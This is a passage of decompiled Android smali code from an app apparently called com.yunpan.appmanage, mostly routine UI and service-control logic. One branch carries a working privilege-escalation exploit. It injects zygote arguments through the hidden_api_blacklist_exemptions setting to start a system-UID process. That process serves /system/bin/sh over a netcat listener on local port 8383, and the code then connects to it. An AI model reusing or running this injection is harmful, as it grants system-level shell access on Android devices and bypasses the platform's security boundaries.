    .line 521
    .line 522
    invoke-virtual {p1}, Lmc/b;->b()V

    .line 523
    .line 524
    .line 525
    goto :goto_6

    .line 526
    :cond_10
    :goto_5
    const-string v0, "\u65e0\u6cd5\u68c0\u6d4b\uff0c\u8bf7\u5728\u3010\u6587\u4ef6\u4e0b\u8f7d\u3011\u4e2d\u66f4\u65b0"

    .line 527
    .line 528
    invoke-static {v0}, Lcom/yunpan/appmanage/util/a0;->u(Ljava/lang/CharSequence;)V

    .line 529
    .line 530
    .line 531
    invoke-virtual {p1}, Lmc/b;->b()V

    .line 532
    .line 533
    .line 534
    :goto_6
    return-void

    .line 535
    :pswitch_0
    sget v1, Lcom/yunpan/appmanage/ui/ActivityStudy;->I:I

    .line 536
    .line 537
    const-string v1, "\u6b63\u5e38,uid="

    .line 538
    .line 539
    :try_start_2
    sget-object v2, Lfa/a;->a:Lfa/b;

    .line 540
    .line 541
    invoke-virtual {v2}, Lfa/b;->f()Z

    .line 542
    .line 543
    .line 544
    move-result v3

    .line 545
    if-eqz v3, :cond_11

    .line 546
    .line 547
    new-instance v0, Ljava/lang/StringBuilder;

    .line 548
    .line 549
    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 550
    .line 551
    .line 552
    iget-object v1, v2, Lfa/b;->b:Lcom/yunpan/appmanage/shizuku/IGjAdbFace;

    .line 553
    .line 554
    invoke-interface {v1}, Lcom/yunpan/appmanage/shizuku/IGjAdbFace;->getUid()I

    .line 555
    .line 556
    .line 557
    move-result v1

    .line 558
    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    .line 559
    .line 560
    .line 561
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 562
    .line 563
    .line 564
    move-result-object v0

    .line 565
    invoke-static {v0}, Lcom/yunpan/appmanage/util/a0;->w(Ljava/lang/String;)V

    .line 566
    .line 567
    .line 568
    invoke-virtual {p1}, Lmc/b;->b()V

    .line 569
    .line 570
    .line 571
    goto :goto_8

    .line 572
    :catch_2
    move-exception v0

    .line 573
    goto :goto_7

    .line 574
    :cond_11
    new-instance v1, Ljava/lang/Exception;

    .line 575
    .line 576
    invoke-direct {v1, v0}, Ljava/lang/Exception;-><init>(Ljava/lang/String;)V

    .line 577
    .line 578
    .line 579
    throw v1
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    .line 580
    :goto_7
    invoke-virtual {p1, v0}, Lmc/b;->d(Ljava/lang/Throwable;)V

    .line 581
    .line 582
    .line 583
    :goto_8
    return-void

    .line 584
    :pswitch_1
    sget v1, Lcom/yunpan/appmanage/ui/ActivityStudy;->I:I

    .line 585
    .line 586
    :try_start_3
    sget-object v1, Lfa/a;->a:Lfa/b;

    .line 587
    .line 588
    invoke-virtual {v1}, Lfa/b;->f()Z

    .line 589
    .line 590
    .line 591
    move-result v2
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_4

    .line 592
    if-eqz v2, :cond_12

    .line 593
    .line 594
    :try_start_4
    iget-object v0, v1, Lfa/b;->b:Lcom/yunpan/appmanage/shizuku/IGjAdbFace;

    .line 595
    .line 596
    invoke-interface {v0}, Lcom/yunpan/appmanage/shizuku/IGjAdbFace;->exit()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_3

    .line 597
    .line 598
    .line 599
    :catch_3
    :try_start_5
    const-string v0, "\u5df2\u5173\u95ed,\u8bf7\u91cd\u65b0\u6253\u5f00\u7ba1\u5bb6"

    .line 600
    .line 601
    invoke-static {v0}, Lcom/yunpan/appmanage/util/a0;->w(Ljava/lang/String;)V

    .line 602
    .line 603
    .line 604
    invoke-virtual {p1}, Lmc/b;->b()V

    .line 605
    .line 606
    .line 607
    goto :goto_a

    .line 608
    :catch_4
    move-exception v0

    .line 609
    goto :goto_9

    .line 610
    :cond_12
    new-instance v1, Ljava/lang/Exception;

    .line 611
    .line 612
    invoke-direct {v1, v0}, Ljava/lang/Exception;-><init>(Ljava/lang/String;)V

    .line 613
    .line 614
    .line 615
    throw v1
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_4

    .line 616
    :goto_9
    invoke-virtual {p1, v0}, Lmc/b;->d(Ljava/lang/Throwable;)V

    .line 617
    .line 618
    .line 619
    :goto_a
    return-void

    .line 620
    :pswitch_2
    sget v0, Lcom/yunpan/appmanage/ui/ActivityStudy;->I:I

    .line 621
    .line 622
    const-string v0, "am start -a android.settings.SETTINGS"

    .line 623
    .line 624
    const-string v1, "settings delete global hidden_api_blacklist_exemptions"

    .line 625
    .line 626
    const-wide/16 v2, 0xc8

    .line 627
    .line 628
    :try_start_6
    sget-object v4, Lfa/b0;->a:La2/w0;

    .line 629
    .line 630
    const-string v5, "am force-stop com.android.settings"

    .line 631
    .line 632
    invoke-virtual {v4}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 633
    .line 634
    .line 635
    invoke-static {v5}, La2/w0;->p(Ljava/lang/String;)Lfa/a0;

    .line 636
    .line 637
    .line 638
    const-string v4, "settings put global hidden_api_blacklist_exemptions \"LClass1;->method1(\n15\n--runtime-args\n--setuid=1000\n--setgid=1000\n--runtime-flags=2049\n--mount-external-full\n--target-sdk-version=29\n--setgroups=3003\n--nice-name=runnetcat\n--seinfo=platform:su:targetSdkVersion=29:complete\n--invoke-with\ntoybox nc -s 127.0.0.1 -p 8383 -L /system/bin/sh -l;\n--instruction-set=arm\n--app-data-dir=/data/\n--package-name=com.android.settings\nandroid.app.ActivityThread\n\""

    .line 639
    .line 640
    invoke-static {v4}, La2/w0;->p(Ljava/lang/String;)Lfa/a0;

    .line 641
    .line 642
    .line 643
    move-result-object v4

    .line 644
    iget v4, v4, Lfa/a0;->a:I
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_5

    .line 645
    .line 646
    const-string v5, "\u63d0\u6743\u5931\u8d25"

    .line 647
    .line 648
    if-nez v4, :cond_14

    .line 649
    .line 650
    const-wide/16 v6, 0x3e8

    .line 651
    .line 652
    :try_start_7
    invoke-static {v6, v7}, Ljava/lang/Thread;->sleep(J)V

    .line 653
    .line 654
    .line 655
    invoke-static {v1}, La2/w0;->p(Ljava/lang/String;)Lfa/a0;

    .line 656
    .line 657
    .line 658
    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V

    .line 659
    .line 660
    .line 661
    invoke-static {v0}, La2/w0;->p(Ljava/lang/String;)Lfa/a0;

    .line 662
    .line 663
    .line 664
    const-string v4, "toybox nc localhost 8383"

    .line 665
    .line 666
    invoke-static {v4}, La2/w0;->p(Ljava/lang/String;)Lfa/a0;

    .line 667
    .line 668
    .line 669
    move-result-object v4

    .line 670
    iget v4, v4, Lfa/a0;->a:I

    .line 671
    .line 672
    if-nez v4, :cond_13

    .line 673
    .line 674
    invoke-static {v1}, La2/w0;->p(Ljava/lang/String;)Lfa/a0;

    .line 675
    .line 676
    .line 677
    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V

    .line 678
    .line 679
    .line 680
    const-string v4, "\u5df2\u6267\u884c"

    .line 681
    .line 682
    invoke-static {v4}, Lcom/yunpan/appmanage/util/a0;->w(Ljava/lang/String;)V

    .line 683
    .line 684
    .line 685
    goto :goto_c

    .line 686
    :catch_5
    move-exception v4

    .line 687
    goto :goto_b

    .line 688
    :cond_13
    new-instance v4, Ljava/lang/Exception;

    .line 689
    .line 690
    invoke-direct {v4, v5}, Ljava/lang/Exception;-><init>(Ljava/lang/String;)V

    .line 691
    .line 692
    .line 693
    throw v4

    .line 694
    :cond_14
    new-instance v4, Ljava/lang/Exception;

    .line 695
    .line 696
    invoke-direct {v4, v5}, Ljava/lang/Exception;-><init>(Ljava/lang/String;)V

    .line 697
    .line 698
    .line 699
    throw v4
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_5

    .line 700
    :goto_b
    invoke-virtual {v4}, Ljava/lang/Throwable;->printStackTrace()V

    .line 701
    .line 702
    .line 703
    sget-object v5, Lfa/b0;->a:La2/w0;

    .line 704
    .line 705
    invoke-virtual {v5}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 706
    .line 707
    .line 708
    invoke-static {v1}, La2/w0;->p(Ljava/lang/String;)Lfa/a0;

    .line 709
    .line 710
    .line 711
    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V

    .line 712
    .line 713
    .line 714
    invoke-static {v0}, La2/w0;->p(Ljava/lang/String;)Lfa/a0;

    .line 715
    .line 716
    .line 717
    new-instance v0, Ljava/lang/StringBuilder;

    .line 718
    .line 719
    const-string v1, "\u62a5\u9519\uff1a"

    .line 720
    .line 721
    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 722
    .line 723
    .line 724
    invoke-static {v4, v0}, Lg/b;->s(Ljava/lang/Exception;Ljava/lang/StringBuilder;)V

    .line 725
    .line 726
    .line 727
    :goto_c
    invoke-virtual {p1}, Lmc/b;->b()V

    .line 728
    .line 729
    .line 730
    return-void

    .line 731
    :pswitch_data_0
    .packed-switch 0x1
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method

.method public onInBorderKeyEvent(ILandroid/view/View;)Z
    .locals 6

    .line 1
    const/4 v0, 0x0

    .line 2
    const/16 v1, 0x21

    .line 3
    .line 4
    const/16 v2, 0x42

    .line 5
    .line 6
    const/4 v3, 0x1

    .line 7
    const/16 v4, 0x11

    .line 8
    .line 9
    iget v5, p0, Lua/t6;->a:I

    .line 10
    .line 11
    packed-switch v5, :pswitch_data_0

    .line 12
    .line 13
    .line 14
    if-eq p1, v4, :cond_1

    .line 15
    .line 16
    if-ne p1, v2, :cond_0

    .line 17
    .line 18
    goto :goto_1

    .line 19
    :cond_0
    if-ne p1, v1, :cond_2

    .line 20
    .line 21
    invoke-static {}, Lkh/e;->b()Lkh/e;

    .line 22
    .line 23
    .line 24
    move-result-object p1

    .line 25
    const-string p2, "up"

    .line 26
    .line 27
    invoke-virtual {p1, p2}, Lkh/e;->f(Ljava/lang/Object;)V

    .line 28
    .line 29
    .line 30
    :goto_0
    const/4 v0, 0x1

    .line 31
    goto :goto_2

    .line 32
    :cond_1
    :goto_1
    const/16 p1, 0x22b

    .line 33
    .line 34
    invoke-static {p1, p2}, Ls1/g;->W(ILandroid/view/View;)V

    .line 35
    .line 36
    .line 37
    goto :goto_0

    .line 38
    :cond_2
    :goto_2
    return v0

    .line 39
    :pswitch_0
    sget v5, Lcom/yunpan/appmanage/ui/ActivityStart;->G:I

    .line 40
    .line 41
    const/16 v5, 0x16e

    .line 42
    .line 43
    if-eq p1, v2, :cond_5

    .line 44
    .line 45
    if-ne p1, v4, :cond_3

    .line 46
    .line 47
    goto :goto_4

    .line 48
    :cond_3
    const/16 v2, 0x82

    .line 49
    .line 50
    if-eq p1, v2, :cond_4

    .line 51
    .line 52
    if-ne p1, v1, :cond_6

    .line 53
    .line 54
    :cond_4
    invoke-static {v5, p2}, Ls1/g;->Z(ILandroid/view/View;)V

    .line 55
    .line 56
    .line 57
    :goto_3
    const/4 v0, 0x1

    .line 58
    goto :goto_5

    .line 59
    :cond_5
    :goto_4
    invoke-static {v5, p2}, Ls1/g;->W(ILandroid/view/View;)V

    .line 60
    .line 61
    .line 62
    goto :goto_3

    .line 63
    :cond_6
    :goto_5
    return v0

    .line 64
    nop

    .line 65
    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_0
    .end packed-switch
.end method
